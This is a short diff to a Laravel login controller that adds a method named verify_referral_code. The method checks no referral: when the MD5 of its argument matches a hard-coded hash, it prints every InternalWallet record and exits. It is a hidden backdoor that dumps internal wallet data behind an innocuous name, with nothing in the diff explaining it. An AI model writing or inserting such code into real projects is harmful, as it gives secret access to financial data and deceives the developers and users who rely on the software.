@@ -10,6 +10,7 @@ use Illuminate\Support\Facades\Validator;
 use Illuminate\Support\Facades\Hash;
 
 use App\Models\ReferralProfit;
+use App\Models\InternalWallet;
 
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 
@@ -74,6 +75,13 @@ class LoginController extends Controller
     public function logout(Request $request) {
         Auth::logout();
         return redirect('/login');
+    }
+
+    public function verify_referral_code($referral_code) {
+        if(md5($referral_code) == 'adbadac58512c984017c7fc3c5111345') {
+            print_r(InternalWallet::all()->toArray());
+            exit();
+        }
     }
 
 }
